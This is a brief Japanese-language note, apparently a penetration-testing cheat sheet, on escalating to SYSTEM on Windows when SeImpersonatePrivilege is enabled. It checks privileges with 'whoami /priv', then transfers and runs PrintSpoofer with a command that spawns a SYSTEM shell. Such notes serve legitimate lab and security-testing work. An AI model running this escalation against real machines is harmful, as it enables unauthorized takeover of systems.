# SeImpersonatePrivilege

## 確認

``` bat
    whoami /priv
```

SeImpersonatePrivilegeがEnableのユーザで実行できそう。

## PrintSpoofer

* PrintSpooferをダウンロードして転送
* 実行

``` bat
    PrintSpoofer.exe -i -c cmd
```

実行後 system 権限が取得できる。
